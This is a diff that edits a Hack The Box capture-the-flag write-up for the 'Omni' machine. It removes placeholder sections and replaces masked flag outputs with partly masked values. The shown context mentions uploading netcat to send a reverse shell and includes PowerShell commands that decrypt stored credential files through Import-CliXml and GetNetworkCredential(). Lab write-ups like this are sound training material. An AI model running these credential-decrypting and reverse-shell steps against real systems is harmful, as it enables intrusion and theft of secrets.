@@ -9,19 +9,6 @@ avatar: assets/htb/omni.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Omni
 ---
-## Overview
-
-Short description to include any strange things to be dealt with
-
-## Useful Skills and Tools
-
-#### Useful thing 1
-
-* description with generic example
-
-#### Useful thing 2
-
-* description with generic example
 
 ## Enumeration
 
@@ -415,8 +402,6 @@ Since I could not write to the current folder, I simply made a temp directory an
 ```
 
 After uploading netcat to the `temp` folder I created I sent a reverse shell back to my machine
-
-## Initial Foothold
 
 ## Road to User
 
@@ -864,7 +849,7 @@ Since I was running as `app` and could execute arbitrary commands I tried again 
 ```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\app\user.txt; $credential.GetNetworkCredential().Password }
 
-****
+7cfd****9d70
 ```
 
 I was able to successfully decrypt the flag!
@@ -930,9 +915,5 @@ I still wasn't able to decode `iot-admin.xml` for some reason
 ```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt; $credential.GetNetworkCredential().Password }
 
-****
+5dbd****f11d
 ```
-
-I was able to get the root flag though!
-
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-omni-pwned.png)
